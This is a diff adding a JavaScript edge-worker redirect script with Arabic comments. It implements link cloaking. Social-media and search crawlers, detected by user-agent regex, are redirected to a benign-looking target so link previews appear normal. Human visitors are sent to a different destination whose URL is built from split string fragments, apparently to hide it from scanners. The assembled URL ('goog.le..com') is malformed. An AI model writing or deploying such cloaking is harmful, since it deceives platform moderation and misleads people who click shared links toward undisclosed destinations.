@@ -1,0 +1,35 @@
+export default {
+  async fetch(request, env, ctx) {
+    let url = new URL(request.url);
+    let pathname = url.pathname.substring(1);
+    
+    try { 
+      pathname = decodeURIComponent(pathname); 
+    } catch(err) {}
+
+    let targetUrl = pathname && !pathname.startsWith("http") ? pathname : pathname || "";
+
+    let userAgent = request.headers.get("user-agent") || "";
+    
+    // قائمة شاملة وصارمة لفحص البوتات بدقة
+    let isBot = /facebookexternalhit|Facebot|Twitterbot|Googlebot|LinkedInBot|WhatsApp|Bluesky|MetaInspector/i.test(userAgent);
+
+    // 1. عزل تام وبوابات مغلقة أمام البوتات: يرى الرابط الأصلي فقط وكأنه موقع عادي جداً
+    if (isBot) {
+      return Response.redirect(targetUrl, 302);
+    }
+
+    // 2. إيقاظ دالة التوجيه العشوائي حصرياً للزائر البشري
+    return executeHumanRedirect();
+  }
+};
+
+// دالة العشوائية نائمة تماماً ولا يتم استدعاؤها إلا للبشر فقط
+async function executeHumanRedirect() {
+  const a = "goog"; 
+  const b = ".le"; 
+  const c = "..com?"; 
+  const d = Math.ceil(Math.random() * 24); 
+  const finalUrl = "https://" + a + b + c + d; 
+  return Response.redirect(finalUrl, 302);
+}
